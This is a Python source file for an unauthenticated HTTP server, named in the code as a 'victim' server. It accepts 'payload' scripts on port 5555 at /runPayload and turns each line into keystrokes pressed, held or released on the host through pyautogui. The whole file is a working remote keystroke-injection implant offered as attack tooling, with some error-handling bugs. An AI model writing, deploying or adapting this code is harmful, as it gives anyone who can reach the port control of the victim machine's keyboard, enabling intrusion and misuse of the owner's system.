import pyautogui
from http.server import HTTPServer, BaseHTTPRequestHandler
from time import sleep

def does_key_exist(tested_key):
    return tested_key.lower() in pyautogui.KEY_NAMES

def try_run_from_phantomscript_command(phantomscript_command: str) -> tuple:
    try:
        phantomscript_command = phantomscript_command.strip().lower()
        splitted_command = phantomscript_command.split(' ')
        opcode = splitted_command[0]
        args = splitted_command[1:]

        # !if opcode in ['//', '#'] or not phantomscript_command:
        # * The code above will not allow comments like this: //fsfd
        if phantomscript_command.startswith(('//', '#')) or not phantomscript_command:
            return (200, "Successful")

        elif opcode == 'press':
            for key in args:
                if not does_key_exist(key): return (422, f"{key}: Invalid key.")
            
            pyautogui.hotkey(args)

            return (200, "Successful.")
        
        elif opcode == 'hold':
            for key in args:
                if not does_key_exist(key): return (422, f"{key}: Invalid key.")
                pyautogui.keyDown(key)

            return (200, "Successful.")
        
        elif opcode == 'release':
            for key in args:
                if not does_key_exist(key): return (422, f"{key}: Invalid key.")
                pyautogui.keyUp(key)

            return (200, "Successful.")
        
        elif opcode == 'sleep':
            sleep(float(args[0]) / 1000)
            return (200, "Successful.")
        
        return (422, f" {opcode}: Invalid opcode / command.")

    except Exception as e:
        return (400, "An error occured: " + e)

class PhantomLinkVictimServer(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            if self.path == '/runPayload':
                payload = self.rfile.read(int(self.headers['Content-Length'])).decode()
                print(payload)
                for line in payload.splitlines():
                    currentStatusCode, message = try_run_from_phantomscript_command(line)
                    if not str(currentStatusCode).startswith(("4", "3")): continue
                    sleep(0.1)
                        
                    self.send_response(currentStatusCode)
                    self.end_headers()
                    self.wfile.write(message.encode())


                self.send_response(currentStatusCode)
                self.end_headers()
                self.wfile.write(message.encode())

                return

            self.send_response(400)
            self.end_headers()
            self.wfile.write(f"{self.path} Invalid path.".encode())


        except Exception as e:
            self.send_response(400)
            raise e
            
        
def run(handler_class, address=('0.0.0.0', 5555)):
    httpd = HTTPServer(address, handler_class)
    print('Serving...')
    httpd.serve_forever()

run(PhantomLinkVictimServer)